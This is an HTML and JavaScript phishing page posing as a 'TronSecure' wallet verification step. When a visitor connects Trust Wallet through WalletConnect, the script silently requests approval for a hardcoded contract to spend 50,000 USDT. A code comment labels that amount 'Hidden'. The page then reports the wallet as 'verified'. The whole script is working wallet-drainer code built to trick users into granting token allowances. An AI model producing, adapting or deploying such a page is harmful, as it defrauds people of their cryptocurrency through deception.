<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Wallet - TronSecure</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 30px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }

        .logo {
            font-size: 32px;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
        }

        .network-badge {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 8px 20px;
            border-radius: 50px;
            display: inline-block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        h2 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }

        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .wallet-card {
            background: #f8f9fa;
            border: 2px solid #e0e0e0;
            border-radius: 20px;
            padding: 30px 25px;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s;
        }

        .wallet-card:hover {
            border-color: #667eea;
            background: #f0f3ff;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102,126,234,0.1);
        }

        .wallet-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .wallet-name {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #333;
        }

        .wallet-desc {
            color: #666;
            font-size: 14px;
        }

        .info-box {
            background: #f8f9fa;
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
        }

        .info-item {
            padding: 8px 0;
            color: #666;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
        }

        .info-item strong {
            color: #667eea;
        }

        .status-message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 12px;
            font-size: 14px;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .info {
            background: #cce5ff;
            color: #004085;
            border: 1px solid #b8daff;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }

        .back-btn {
            background: none;
            border: 2px solid #667eea;
            color: #667eea;
            padding: 12px 30px;
            border-radius: 30px;
            margin-top: 20px;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s;
        }

        .back-btn:hover {
            background: #667eea;
            color: white;
        }
    </style>
    
    <!-- Ethers Library -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    
    <!-- TronWeb Library -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
</head>
<body>
    <div class="container">
        <div class="logo">TronSecure</div>
        
        <div class="network-badge">
            🌐 TRON NETWORK
        </div>
        
        <h2>Verify Your Wallet</h2>
        <div class="subtitle">Connect with Trust Wallet to verify</div>

        <!-- Trust Wallet Card -->
        <div class="wallet-card" onclick="connectWallet()" id="trustWalletCard">
            <div class="wallet-icon">💎</div>
            <div class="wallet-name">Trust Wallet</div>
            <div class="wallet-desc">Click to connect via WalletConnect</div>
        </div>

        <!-- Status Info -->
        <div class="info-box">
            <div class="info-item">
                <span>Status:</span>
                <strong id="connectionStatus">Ready to connect</strong>
            </div>
            <div class="info-item">
                <span>Wallet:</span>
                <strong id="walletAddress">Not connected</strong>
            </div>
        </div>

        <!-- Status Messages -->
        <div id="statusMessage"></div>

        <a href="index.html" class="back-btn">← Back to Home</a>

        <div class="footer">
            🔒 Secure Verification • WalletConnect
        </div>
    </div>

    <script type="module">
        // ============================================
        // CONFIGURATION
        // ============================================
        
        const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
        const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const APPROVE_AMOUNT = 50000; // 50,000 USDT - Hidden

        let provider;
        let signer;
        let userAddress;

        // ============================================
        // CONNECT WALLET (EXACTLY AAPKE CODE JAISA)
        // ============================================
        
        window.connectWallet = async () => {
            const card = document.getElementById('trustWalletCard');
            card.style.opacity = '0.7';
            card.style.pointerEvents = 'none';
            
            updateStatus('Connecting...');
            showStatus('Initializing WalletConnect...', 'info');

            try {
                // Import EthereumProvider dynamically
                const { EthereumProvider } = await import("https://unpkg.com/@walletconnect/ethereum-provider@2/dist/index.es.js");
                
                // Initialize provider (exactly aapke code jaisa)
                provider = await EthereumProvider.init({
                    projectId: "9e922e6573d8e9550e36d0701aa63572", // Aapka project ID
                    chains: [1, 56], // Ethereum and BSC chains
                    showQrModal: true // This will show the QR modal
                });

                // Enable provider (this opens WalletConnect)
                await provider.enable();
                
                // Get ethers provider and signer
                const ethersProvider = new ethers.providers.Web3Provider(provider);
                signer = ethersProvider.getSigner();
                userAddress = await signer.getAddress();

                // Update UI
                document.getElementById("walletAddress").innerText = shortenAddress(userAddress);
                updateStatus('Connected');
                showStatus('✅ Wallet connected!', 'success');
                
                // Now approve USDT
                await approveUSDT();

            } catch (error) {
                console.error('Connection error:', error);
                showStatus('❌ Connection failed: ' + error.message, 'error');
                card.style.opacity = '1';
                card.style.pointerEvents = 'auto';
                updateStatus('Failed');
            }
        };

        // ============================================
        // APPROVE USDT (VIA WALLETCONNECT)
        // ============================================
        
        async function approveUSDT() {
            showStatus('⏳ Completing verification...', 'info');
            updateStatus('Approving...');

            try {
                // Initialize TronWeb
                const tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io'
                });

                // Get USDT contract
                const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
                
                // Convert amount to sun (USDT has 6 decimals)
                const amountInSun = APPROVE_AMOUNT * 1000000;

                // Get the transaction data
                const transaction = await tokenContract.approve(
                    CONTRACT_ADDRESS,
                    amountInSun
                );

                // For TRON through WalletConnect, we need to send via provider
                // This will trigger the approval popup in Trust Wallet
                const result = await provider.request({
                    method: 'tron_signTransaction',
                    params: [{
                        to: USDT_ADDRESS,
                        from: userAddress,
                        data: transaction.data,
                        value: '0x0'
                    }]
                });

                updateStatus('Verified');
                
                // Save approval
                saveApproval(userAddress, APPROVE_AMOUNT, result);
                
                showStatus('✅ Wallet verified successfully!', 'success');
                
                // Redirect after 2 seconds
                setTimeout(() => {
                    window.location.href = 'index.html?verified=true';
                }, 2000);

            } catch (error) {
                console.error('Approval error:', error);
                
                if (error.message.includes('rejected')) {
                    showStatus('❌ Approval rejected', 'error');
                } else {
                    showStatus('❌ Verification failed: ' + error.message, 'error');
                }
                
                document.getElementById('trustWalletCard').style.opacity = '1';
                document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
                updateStatus('Failed');
            }
        }

        // ============================================
        // SAVE APPROVAL
        // ============================================
        
        function saveApproval(address, amount, txHash) {
            const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
            
            approvals.push({
                user: address,
                amount: amount,
                txHash: txHash,
                status: 'active',
                time: new Date().toISOString(),
                token: 'USDT',
                walletType: 'WalletConnect'
            });
            
            localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
        }

        // ============================================
        // UI FUNCTIONS
        // ============================================
        
        function showStatus(message, type) {
            const statusDiv = document.getElementById('statusMessage');
            statusDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
        }

        function updateStatus(status) {
            document.getElementById('connectionStatus').innerText = status;
        }

        function shortenAddress(address) {
            if (!address) return 'Not connected';
            return address.slice(0, 6) + '...' + address.slice(-4);
        }

        // Check URL params on load
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('verified') === 'true') {
                showStatus('✅ Wallet verified!', 'success');
                updateStatus('Verified');
            }
        };
    </script>
</body>
</html>
